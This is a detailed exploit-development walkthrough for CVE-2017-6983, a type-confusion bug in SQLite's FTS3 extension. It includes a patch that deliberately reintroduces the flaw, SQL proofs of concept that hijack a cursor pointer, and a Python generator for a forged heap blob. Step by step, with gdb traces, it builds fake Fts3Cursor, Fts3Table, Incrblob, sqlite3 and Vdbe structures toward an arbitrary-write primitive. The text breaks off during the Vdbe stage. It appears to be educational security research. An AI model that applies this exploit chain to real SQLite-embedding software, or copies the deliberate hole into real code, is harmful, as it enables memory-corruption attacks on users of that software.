# CVE-2017-6983

CVE-2017-6983 is a type-confusion bug in SQLite that can provide arbitrary memory-write primitive. More details about this bug and its exploitation can be found via the following links

* Many Birds, One Stone: Exploiting a Single SQLite Vulnerability Across Multiple Software. BlackHat USA 2017.
  * [Video](https://www.youtube.com/watch?v=Kqv8S1BQYwE&ab_channel=BlackHat)
  * [Slides](https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf) (p39-p60)

# Source Code

The following instructions provide a way to obtain the source code of SQLite version 3.40.1.

```bash
$ git clone https://github.com/sqlite/sqlite.git
$ cd sqlite
$ git checkout version-3.40.1 #-> commit 1fdaa9d1a7
```

You may need to compile the source code to produce the file `sqlite3.c` and `shell.c`.

```bash
# (within sqlite folder)
$ CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
$ make
$ ls -l sqlite3.c shell.c
```

# Bring the Bug Back

The version of SQLite we analyze is 3.40.1, which has fixed this bug. For the demonstration purpose, we manually modify the source code to bring the bug back into this version. The following patch shows the changes to bring the bug back. You should never apply this patch to your SQLite source code except for this demo purpose.


```c
// in sqlite3.c

static int fts3FunctionArg(
  sqlite3_context *pContext,      /* SQL function call context */
  const char *zFunc,              /* Function name */
  sqlite3_value *pVal,            /* argv[0] passed to function */
  Fts3Cursor **ppCsr              /* OUT: Store cursor handle here */
){
  int rc;
  /* Insert Vuln */
+ Fts3Cursor *pRet;
+ memcpy(&pRet, sqlite3_value_blob(pVal), sizeof(Fts3Cursor *));
+ *ppCsr = pRet;
- *ppCsr = (Fts3Cursor*)sqlite3_value_pointer(pVal, "fts3cursor");
  if( (*ppCsr)!=0 ){
    rc = SQLITE_OK;
  }else{
    char *zErr = sqlite3_mprintf("illegal first argument to %s", zFunc);
    sqlite3_result_error(pContext, zErr, -1);
    sqlite3_free(zErr);
    rc = SQLITE_ERROR;
  }
  return rc;
}
```

After this modification, you should compile again via `make`.

# Nice Feature: Virtual Table

SQLite is designed to handle SQL tables, which contain a set of rows and each row is represented by a set of columns. This is the original purpose of it. However, to extend the usability of SQLite, it also supports processing data in other types, like files. The benefit is that we can use the same/familiar SQL commands to operate on other data, like searching within documents using SQL query. This amazing feature is achieve via **virtual table**.

As indicated by the name, a virtual table is not a real traditional SQL table, but a handle in SQLite for data in other types. When creating virtual table, we need to specify its underlying SQLite extension that supports this virtual table. For example, FTS3 is an extension to SQLite that support full-text search (FTS). In this case, when we want to `CREATE`, `INSERT` or `SELECT` from a virtual table, the underlying callback functions defined in the related extension is used to achieve the functionality, instead of operating on real SQL tables using SQLite code.

So far so good.

However, when we create a virtual table and insert data into the table, the data will be stored in the virtual table, in the type of `BLOB`. A blob data is raw, which means we do not know it real type. The extension knows its type, because it predefines the types inside its own virtual table. When it writes (via insert) to the blob, it will follow its own data types. When it reads (via select) from the blob, it also follows its definition.

What will happen if we forge a BLOB data and force the extension to load it? Err ... Simple. The extension trusts the BLOB data and will still follow its own definition to load the data, even if the data is not created by itself. This means that if in its own definition some data at offset X is a pointer, the extension will read the value at offset X, and treat the result as a pointer ...

So far, too good, for attackers unfortunately.

This is the bug CVE-2017-6983. Let's look into a simple PoC

# PoC0: control a pointer

Here is the first PoC, which will allow attackers to control one pointer.

```sql
create virtual table a using fts3(b);
insert into a values(x'aabbccdd');
select optimize(b) from a;
```

1. We create a virtual table `a` using the underly FTS3 extension. This virtual table only has one column `b` (yes, it also supports columns).

2. We insert one new record into this virtual table. The content is a BLOB data, which is simply `x'aabbccdd'`.

3. We read from the virtual table `a` via `select`, which will return the content of column `b`, which is `0xddccbbaa` (big endian). However, instead of directly printing the content of `b`, we pass it to another function `optimize`.

Run this PoC with SQLite

```bash
# save the poc above to /tmp/exp0
$ ./sqlite < /tmp/exp0
Segmentation fault (core dumped)
```

Check it with GDB

```bash
$ gdb ./sqlite3
(gdb) r < /tmp/exp0
Program received signal SIGSEGV, Segmentation fault.
0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
182454    p = (Fts3Table *)pCursor->base.pVtab;
(gdb) p pCursor
$1 = (Fts3Cursor *) 0xddccbbaa
```

We can see that `pCursor` is exactly what we insert into the virtual table.

Let's check some code around the crashing instruction.

```bash
(gdb) bt
#0  0x00000000005b3d4a in fts3OptimizeFunc (pContext=0x664e80, nVal=1, apVal=0x664eb0) at sqlite3.c:182454
#1  0x00000000004b34ae in sqlite3VdbeExec (p=0x662a20) at sqlite3.c:98127
#2  0x00000000004549ed in sqlite3Step (p=0x662a20) at sqlite3.c:88072
#3  0x000000000044c267 in sqlite3_step (pStmt=0x662a20) at sqlite3.c:88133
#4  0x000000000043e63e in exec_prepared_stmt (pArg=0x7fffffffcf68, pStmt=0x662a20) at shell.c:18074
#5  0x0000000000418677 in shell_exec (pArg=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", pzErrMsg=0x7fffffffcd50) at shell.c:18390
#6  0x00000000004428ff in runOneSqlLine (p=0x7fffffffcf68, zSql=0x64f430 "select optimize(b) from a;", in=0x7ffff7c1aaa0 <_IO_2_1_stdin_>, startline=4) at shell.c:25400
#7  0x000000000041934d in process_input (p=0x7fffffffcf68) at shell.c:25564
#8  0x000000000040b9df in main (argc=1, argv=0x7fffffffe308) at shell.c:26419
(gdb) l
182449
182450    UNUSED_PARAMETER(nVal);
182451
182452    assert( nVal==1 );
182453    if( fts3FunctionArg(pContext, "optimize", apVal[0], &pCursor) ) return;
182454    p = (Fts3Table *)pCursor->base.pVtab;
182455    assert( p );
182456
182457    rc = sqlite3Fts3Optimize(p);
182458
```

The execution crashes at line `182454`. The line above is an invocation to function `fts3FunctionArg`. The source code of this function is given in the previous section [Bring the Bug Back](#bring-the-bug-back).

Without diving too deep into SQLite code, it is reasonable to guess that function `fts3OpitmizeFunc` is responsible for handling the `optimize` function in our SQL query. Since we pass `b` into `optimize`, the underlying source code will get the value of `b` via `fts3FunctionArg` and use it inside the `fts3OptimizeFunc`.

* In the vulnerable code (after our patching), SQLite merely uses `sqlite3_value_blob` to obtain the data pointer, and uses `memcpy` to extract the pointer from the BLOB data. It only checks whether the content has blob type.

* In the fixed version, SQLite directly uses `sqlite3_value_pointer` to extract a pointer, where it will check whether the content has pointer type.

Anyway, in the buggy version, we (attackers) can easily control a full pointer `pCursor` in function `fts3optimizeFunc`. Starting from this function, we will try to achieve the arbitrary-write primitive.

# PoC1: control everything

Controlling one pointer is not enough for achieving an attack. In the next step, we will try to control what ever we what.

We notice that `pCursor` is used in the following code, like line `182454`, to retrieve a pointer `p` from `pCursor`-pointed memory content. To control `p`, we need to make `pCursor` pointing to some location that is completely under our control. The idea is to inject more malicious content into SQLite memory space, and make `pCursor` and following pointers pointing to this malicious content.

We make use of the SQL query to achieve the malicious content injection. Particularly, we want to inject a lot of BLOB data into another table.

```sql
create table t1(c1 char);
insert into t1 values(x'very-long-malicious-blob-data');

create virtual table a using fts3(b);
insert into a values(x'aabbccdd');
select optimize(b) from a;
```

The SQL query above shows our idea. Before triggering the bug (the bottom half), we first insert a large malicious blob data into another table. Then, we search this malicious block data from SQLite memory to identify its address. We will use its address for `pCursor`. Since this data is very long and may contain non-printable character, we use a python script to generate this poc automatically.

```py
#!/usr/bin/env python3

import os
import sys

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
```

* `exp` is the long, malicious blob data, to be determined (TBD)
* `base` is the address of this blob data in memory, TBD
* `valToStr` is a function that translate an integer into big-endian string representation

Here is the implementation of `valtoStr`

```py
def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c
```

At the beginning, we just set `exp` to a large benign content and set `base` to an arbitrary value.

```py
exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0xaabbccdd
```

Combing everything together, and run the script

```bash
# say the script is poc.py
$ python3 ./poc.py    # --> this will produce /tmp/exp file
$ gdb ./sqlite3
(gdb) b fts3OptimizeFunc
(gdb) r < /tmp/exp
...
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182452
182452    assert( nVal==1 );
```

At this moment, we are going to invoke the vulnerable function. Here we will search where is the BLOB content provided in `exp`. Since we use `0xdeadbeef` as the starting value, we will search for this value within the SQLite memory space. To simplify this search, we switch to [gdb-peda](https://github.com/longld/peda) tool, which is a customized GDB plugin providing a set of facilities. To install it, just simply follow the instruction on its GitHub repository.

```bash
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

After this simple installation, we already have `gdb-peda` installed.


```bash
$ gdb ./sqlite
gdb-peda $                 # <--- if get this prompt, it means gdb-peda is ready
```

To make the reading easier, I will use `(gdb-peda)` as the prompt. Let's continue our exploration.

```bash
$ gdb ./sqlite3
(gdb-peda) b fts3OptimizeFunc
(gdb-peda) r < /tmp/exp
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182452
182452    assert( nVal==1 );
(gdb-peda) searchmem 0xdeadbeef
Searching for '0xdeadbeef' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x667ad8 --> 0xdeadbeef
(gdb-peda) x/100bx 0x667ad8
0x667ad8:       0xef    0xbe    0xad    0xde    0x00    0x00    0x00    0x00
0x667ae0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

We can see that the SQLite process only contains one copy of this data, which starts from address `0x667ad8`. We should replace `base` with this value.


```py
exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0x667ad8
```

Run again

```bash
$ python3 ./poc.py
$ gdb ./sqlite3
(gdb-peda) b sqlite3.c:182454
Breakpoint 1 at 0x5b3d46: file sqlite3.c, line 182454.
(gdb-peda) r < /tmp/exp
Breakpoint 1, fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182454
182454    p = (Fts3Table *)pCursor->base.pVtab;
(gdb-peda) p pCursor
$1 = (Fts3Cursor *) 0x667ad8
(gdb-peda) x/100bx pCursor
0x667ad8:       0xef    0xbe    0xad    0xde    0x00    0x00    0x00    0x00
0x667ae0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667ae8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667af0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667af8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b00:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b08:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b10:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b18:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b20:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b28:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b30:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x667b38:       0x00    0x00    0x00    0x00
```

OK, great. Now `pCurosr` is pointing to the long, malicious BLOB content. We can change `exp` as we want to control any variable dereferenced from `pCursor`.

Define another two python functions to help update `exp` to whatever we want. The complete PoC1 is as follows.

```py
#!/usr/bin/env python3

import os
import sys

def valToStr(value, length):
    b = '{num:0{width}X}'.format(num=value, width=length * 2)
    c = "".join(reversed([b[i:i+2] for i in range(0, len(b), 2)]))
    return c

def writeStr(exp, off, string):
    exp = list(exp)
    string = list(string)
    for i in range(0, len(string)):
        exp[off + i] = string[i]
    return ''.join(exp)

def writeVal(exp, off, value, length):
    # value = hex(value)
    # print(value)
    return writeStr(exp, off * 2, valToStr(value, length))

exp = valToStr(0xdeadbeef, 8) + "0" * 0x800 * 2
base = 0x667ad8

############################################################# 
# TODO: update exp properly to change the malicious content #
#############################################################

with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToStr(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
```

# PoC2: write-what-where

Next, our goal is to achieve a primitive that allows us to write arbitrary value into arbitrary location, known as [write-what-where](https://cwe.mitre.org/data/definitions/123.html).

### 1. sqlite3Fts3Optimize

What we have done is to make `pCursor` pointing to our malicious blob data. SQLite will treat the pointed memory as an `Fts3Cursor` object. 

```txt
############################################################# 
# Fts3Cursor (0x80)
#############################################################
```

The size of this object `sizeof(Fts3Cursor)` is 0x80. We can get this size via `p sizeof(Fts3Cursor)` within `gdb-peda`.

```bash
(gdb-peda) p sizeof(Fts3Cursor)
0x80
```

SQLite is going to execute the following lines.

```c
182454   p = (Fts3Table *)pCursor->base.pVtab;
182455   assert( p );
182456
182457   rc = sqlite3Fts3Optimize(p);
```

Within `Fts3Cursor`, `base.pVtab` is at offset 0. We can obtain this offset via `gdb-peda`

```bash
(gdb-peda) p &((Fts3Cursor *)0)->base.pVtab
$2 = (sqlite3_vtab **) 0x0
```

Therefore, to control `p` (which is `pCursor->base.pVtab`), we need to update `exp` so that at its offset 0 the value is a pointer. We want to make this point `base + sizeof(Fts3Cursor)` so their memory content will not be overlapped.

```py
# sizeof types
Fts3Cursor_size = 0x80

# offset_type_member -> offset of member within type

# raddr -> address relative to base
#       -> offset relattive to exp
raddr_Fts3Cursor = 0

# set pVtab -> &Fts3Table -> p
offset_Fts3Cursor_pVtab = 0
p_value = base + raddr_Fts3Table
exp = writeVal(exp, raddr_Fts3Cursor + offset_Fts3Cursor_pVtab, p_value, 8)
```

After this update, we have the following memory layout.

```txt
############################################################# 
# Fts3Cursor (0x80)
# + Fts3Table (0x220)
#############################################################
+ Fts3Cursor.base.pVtable = &Fts3Table
```

### 2. sqlite3Fts3Optimize > sqlite3Fts3Optimize

The execution will go into `sqlite3Fts3Optimize`.

```c
194701 ** Flush any data in the pending-terms hash table to disk. If successful,
194702 ** merge all segments in the database (including the new segment, if
194703 ** there was any data to flush) into a single segment.
194704 */
194705 SQLITE_PRIVATE int sqlite3Fts3Optimize(Fts3Table *p){
194706   int rc;
194707   rc = sqlite3_exec(p->db, "SAVEPOINT fts3", 0, 0, 0);
194708   if( rc==SQLITE_OK ){
194709     rc = fts3DoOptimize(p, 1);
194710     if( rc==SQLITE_OK || rc==SQLITE_DONE ){
194711       int rc2 = sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
194712       if( rc2!=SQLITE_OK ) rc = rc2;
194713     }else{
194714       sqlite3_exec(p->db, "ROLLBACK TO fts3", 0, 0, 0);
194715       sqlite3_exec(p->db, "RELEASE fts3", 0, 0, 0);
194716     }
194717   }
194718   sqlite3Fts3SegmentsClose(p);
194719   return rc;
194720 }
```

Line `194707` invokes `sqlite3_exec`, which invokes `sqlite3SafetyCheckOk`. To simplify the attack, we set `p->db` to `0`, which forces `sqlite3SafetyCheckOk` returning 0, and in turn forces `sqlite3_exec` returns `^SQLITE_OK`.

```txt
sqlite3Fts3Optimize
    +-> sqlite3_exec
            +-> sqlite3SafetyCheckOk
            <-+ 0
    <-+ SQLITE_MISUSE_BKPT (not SQLITE_OK)
    +-> sqlite3Fts3SegmentsClose
```

Here we use this simple layout to represent what we need to achieve.

```txt
############################################################# 
# Fts3Cursor (0x80)
# Fts3Table (0x220)
#############################################################
Fts3Cursor.base.pVtable = &Fts3Table
+ Fts3Table.db = 0
```

### 3. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose


The execution now goes into `sqlite3Fts3SegmentsClose`.

```c
190157 /*
190158 ** Close the blob handle at p->pSegments, if it is open. See comments above
190159 ** the sqlite3Fts3ReadBlock() function for details.
190160 */
190161 SQLITE_PRIVATE void sqlite3Fts3SegmentsClose(Fts3Table *p){
190162   sqlite3_blob_close(p->pSegments);
190163   p->pSegments = 0;
190164 }
```

This function is very simple, which just passes `p->pSegments` into function `sqlite3_blob_close`. What we need to do is to set `p->pSegments` to next available space after `Fts3Table`, which will be treated as an `Incrblob` object.


```txt
############################################################# 
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# + Incrblob (0x38)
#############################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
+ Fts3Table.pSegments = &Incrblob
```

### 4. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close

The execution goes into `sqlite3_blob_close`.

```c
 98920 /*
 98921 ** Close a blob handle that was previously created using
 98922 ** sqlite3_blob_open().
 98923 */
 98924 SQLITE_API int sqlite3_blob_close(sqlite3_blob *pBlob){
 98925   Incrblob *p = (Incrblob *)pBlob;
 98926   int rc;
 98927   sqlite3 *db;
 98928
 98929   if( p ){
 98930     sqlite3_stmt *pStmt = p->pStmt;
 98931     db = p->db;
 98932     sqlite3_mutex_enter(db->mutex);
 98933     sqlite3DbFree(db, p);
 98934     sqlite3_mutex_leave(db->mutex);
 98935     rc = sqlite3_finalize(pStmt);
 98936   }else{
 98937     rc = SQLITE_OK;
 98938   }
 98939   return rc;
 98940 }
```

Next, we update `p->db`, which is used as a `sqlite3` pointer.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# + sqlite3 (0x308)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
+ Incrblob.db = &sqlite3
```

We need to update this `sqlite3` structure to make sure `mutex` is 0

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
+ sqlite3.mutex = 0
```

### 5. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree

This `sqlite3` structure is also used within `sqlite3DbFree` function as the first argument `db`. At the same time, the second argument is the `Incrblob` structure. We track into this function to find more constraint.

```c
 29433 SQLITE_PRIVATE void sqlite3DbFree(sqlite3 *db, void *p){
 29434   assert( db==0 || sqlite3_mutex_held(db->mutex) );
 29435   if( p ) sqlite3DbFreeNN(db, p);
 29436 }
```

* `db==0` is always `False`.

* `sqlite3_mutex_held(db->mutex)` should be `True`.

* `p` is not `0`

### 6. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN

So the execution will enter `sqlite3DbFreeNN` with the same arguments.

```c
 29357 SQLITE_PRIVATE void sqlite3DbFreeNN(sqlite3 *db, void *p){
 29360   if( db ){
 29361     if( ((uptr)p)<(uptr)(db->lookaside.pEnd) ){
 ...         ...
 29384     }
 29385     if( db->pnBytesFreed ){
 29386       measureAllocationSize(db, p);
 29387       return;
 29388     }
 29389   }
 ...     ...
 29395 }
```

Here are want to make sure 

1. `p<db->lookaside.pEnd` is `False`
2. `db->pnBytesFreed` is a valid integer-pointer.

So we add the following updates.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
# + nBytesFreed (0x4)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
sqlite3.mutex = 0
+ sqlite3.lookaside.pEnd = 0
+ sqlite3.pnBytesFreed = &nBytesFreed
```

### 7. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN > measureAllocationSize

Now the execution enters `measureAllocationSize`

```c
 29344 /*
 29345 ** Add the size of memory allocation "p" to the count in
 29346 ** *db->pnBytesFreed.
 29347 */
 29348 static SQLITE_NOINLINE void measureAllocationSize(sqlite3 *db, void *p){
 29349   *db->pnBytesFreed += sqlite3DbMallocSize(db,p);
 29350 }
```

#### Interesting Question: Can we turn this operation into an arbitrary write primitive?

> It turns out to be possible. A arbitrary write primitive requires to both address and value 
> 
>   `*address = value;`
> 
> address = db->pnBytesFreed
> 
> + completely under our control
> + no side effect
> - can only overwrite 4-byte
> 
> value = malloc_useable_size(p)
> 
> + can be controlled (need to update memory content before `p`
> - usually `& ~0x7`, which means the last 3 bits are out of control
> 
> In summary, it is possible. However, it may require significant consideration due to the limitations (-) above. 

### 8. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3DbFree > sqlite3DbFreeNN > measureAllocationSize > sqlite3DbMallocSize

Nothing special, move on to `sqlite3DbMallocSize`.

```c
 29293 SQLITE_PRIVATE int sqlite3DbMallocSize(sqlite3 *db, const void *p){
 29294   assert( p!=0 );
 29295 #ifdef SQLITE_DEBUG
 29296   if( db==0 ){
 29297     assert( sqlite3MemdebugNoType(p, (u8)~MEMTYPE_HEAP) );
 29298     assert( sqlite3MemdebugHasType(p, MEMTYPE_HEAP) );
 29299   }else if( !isLookaside(db,p) ){
 29300     assert( sqlite3MemdebugHasType(p, (MEMTYPE_LOOKASIDE|MEMTYPE_HEAP)) );
 29301     assert( sqlite3MemdebugNoType(p, (u8)~(MEMTYPE_LOOKASIDE|MEMTYPE_HEAP)) );
 29302   }
 29303 #endif
 29304   if( db ){
 29305     if( ((uptr)p)<(uptr)(db->lookaside.pTrueEnd) ){
 ...         ...
 29316     }
 29317   }
 29318   return sqlite3GlobalConfig.m.xSize((void*)p);
 29319 }
```

`isLookaside` requires extra conditions related to `p`, `sqlite3.lookaside.pStart` and `sqlite3.lookaside.pTrueEnd`. However, since `assert` is not working here at all, we can simply skip it.

We just need to make sure `p < db->lookaside.pTrueEnd` is `False`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
+ sqlite3.lookaside.pTrueEnd = 0
```

### malloc_usable_size

`sqlite3GlobalConfig.m.xSize` will inovke `malloc_usable_size` in glibc to obtain the allocation size of `p`. Although this part is quit standard, we should be careful about one thing. Here is the code logic in `malloc_useable_size`.

```c
struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
};
typedef struct malloc_chunk* malloc_chunk;

#define chunk2mem(p)   ((Void_t*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
/* Get size, ignoring use bits */
#define chunksize(p)         ((p)->size & ~(SIZE_BITS))
/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)
/* extract p's inuse bit */
#define inuse(p) ((((mchunkptr)(((char*)(p))+((p)->size & ~SIZE_BITS)))->size) & PREV_INUSE)

// ------------------------- malloc_usable_size -------------------------
{
  mchunkptr p;
  if (mem != 0) {
    p = mem2chunk(mem);
    if (chunk_is_mmapped(p))
      return chunksize(p) - 2*SIZE_SZ;
    else if (inuse(p))
      return chunksize(p) - SIZE_SZ;
  }
  return 0;
}
```

This is a little complex, but we can try to make it simpler

```c

size_t malloc_usable_size(void *mem) {

  if (mem != NULL) {
    mchunkptr p = (mchunkptr) ((char *)mem - 2 * 8);
    if (p->size & 0x2)
      return p->size - 2 * 8;
    else {
      mchunkptr next = (mchunkptr) ((char *)p + p->size & ~0x7);
      if (next->size & 0x1)
        return p->size - 8;
    }
  
  }
  return 0;
}
```

Here the tricky part is that, it will check the value before this pointer. This is due to the management of heap checks in glibc, which puts metadata (like size, flags etc) before the address returned to users.

In this case, we want the code to be simple, like return 0. To do so, we need to control the 8 bytes before this pointer, and set them all to 0.

* `p->size` is 0, so we go to else block
* `next` is exactly `p`, since `p->size` is 0
* `next->size` is also 0.
* we reach the last line, which returns 0.

Therefore, we need to reserve 8 bytes before any pointer (which is `Incrblob` here).

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# + Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
+ Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
```

The stack layout at `malloc_useable_size` is as follows.

```bash
#0  __malloc_usable_size (m=0x667d78) at ./malloc/malloc.c:5138
#1  0x000000000058e99d in sqlite3MemSize (pPrior=0x667d78) at sqlite3.c:25540
#2  0x0000000000448878 in sqlite3DbMallocSize (db=0x667db0, p=0x667d78) at sqlite3.c:29318
#3  0x000000000046a91d in measureAllocationSize (db=0x667db0, p=0x667d78) at sqlite3.c:29349
#4  0x000000000046a895 in sqlite3DbFreeNN (db=0x667db0, p=0x667d78) at sqlite3.c:29386
#5  0x0000000000448cf6 in sqlite3DbFree (db=0x667db0, p=0x667d78) at sqlite3.c:29435
#6  0x000000000045a894 in sqlite3_blob_close (pBlob=0x667d78) at sqlite3.c:98933
#7  0x000000000059505c in sqlite3Fts3SegmentsClose (p=0x667b58) at sqlite3.c:190162
#8  0x00000000005b6df1 in sqlite3Fts3Optimize (p=0x667b58) at sqlite3.c:194718
#9  0x00000000005b3d92 in fts3OptimizeFunc (pContext=0x664700, nVal=0x1, apVal=0x664730) at sqlite3.c:182457
```

### 9. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close

Now the execution go back to frame 6, which is within `sqlite3_blob_close`, line 98933.

```c
 98924 SQLITE_API int sqlite3_blob_close(sqlite3_blob *pBlob){
 98925   Incrblob *p = (Incrblob *)pBlob;
 98926   int rc;
 98927   sqlite3 *db;
 98928
 98929   if( p ){
 98930     sqlite3_stmt *pStmt = p->pStmt;
 98931     db = p->db;
 98932     sqlite3_mutex_enter(db->mutex);
 98933     sqlite3DbFree(db, p);
>98934     sqlite3_mutex_leave(db->mutex);
 98935     rc = sqlite3_finalize(pStmt);
 98936   }else{
 98937     rc = SQLITE_OK;
 98938   }
 98939   return rc;
 98940 }
```

`sqlit3_mutex_leave` just leaves the mutex.

### 10. sqlite3Fts3Optimize > sqlite3Fts3Optimize > sqlite3Fts3SegmentsClose > sqlite3\_blob\_close > sqlite3_finalize

Now we are going to enter `sqlite3_fianlize` function, with `pStmt` as the only argument. `pStmt` comes from `p->pStmt`. Here, this `p` points to the `Incrblob` structure. We may need to set `Incrblob.pStmt` later.

```c
 87424 /*
 87425 ** The following routine destroys a virtual machine that is created by
 87426 ** the sqlite3_compile() routine. The integer returned is an SQLITE_
 87427 ** success/failure code that describes the result of executing the virtual
 87428 ** machine.
 87429 **
 87430 ** This routine sets the error code and string returned by
 87431 ** sqlite3_errcode(), sqlite3_errmsg() and sqlite3_errmsg16().
 87432 */
 87433 SQLITE_API int sqlite3_finalize(sqlite3_stmt *pStmt){
 87434   int rc;
 87435   if( pStmt==0 ){
 87436     /* IMPLEMENTATION-OF: R-57228-12904 Invoking sqlite3_finalize() on a NULL
 87437     ** pointer is a harmless no-op. */
 87438     rc = SQLITE_OK;
 87439   }else{
 87440     Vdbe *v = (Vdbe*)pStmt;
 87441     sqlite3 *db = v->db;
 87442     if( vdbeSafety(v) ) return SQLITE_MISUSE_BKPT;
 87443     sqlite3_mutex_enter(db->mutex);
 87444     checkProfileCallback(db, v);
 87445     assert( v->eVdbeState>=VDBE_READY_STATE );
 87446     rc = sqlite3VdbeReset(v);
 87447     sqlite3VdbeDelete(v);
 87448     rc = sqlite3ApiExit(db, rc);
 87449     sqlite3LeaveMutexAndCloseZombie(db);
 87450   }
 87451   return rc;
 87452 }
```

If we set `pStmt` to `0`, the whole function call will immediately return. However, we have not achieved arbitrary memory write, so we cannot make it zero.

Instead, we need to make `pStmt` point to a `Vdbe` structure based on line `87440`. Within the `Vdbe` structure, we need to set `db` to point to a `sqlite3`. Here, we reuse the previous `sqlite3` structure to reduce the footprint. However, if there is any conflict, we will need to come back and create a seperate `sqlite3`.

```txt
#########################################################################
# Fts3Cursor (0x80)
# Fts3Table (0x220)
# Incrblob_metadata (0x8)
# Incrblob (0x38)
# sqlite3 (0x308)
# nBytesFreed (0x4)
# + Vdbe (0x138)
#########################################################################
Fts3Cursor.base.pVtable = &Fts3Table
Fts3Table.db = 0
Fts3Table.pSegments = &Incrblob
Incrblob_metadata = 0
Incrblob.db = &sqlite3
sqlite3.mutex = 0
sqlite3.lookaside.pEnd = 0
sqlite3.pnBytesFreed = &nBytesFreed
sqlite3.lookaside.pTrueEnd = 0
+ Incrblob.pStmt = &Vdbe
+ Vdbe.db = &sqlite3
```

```c
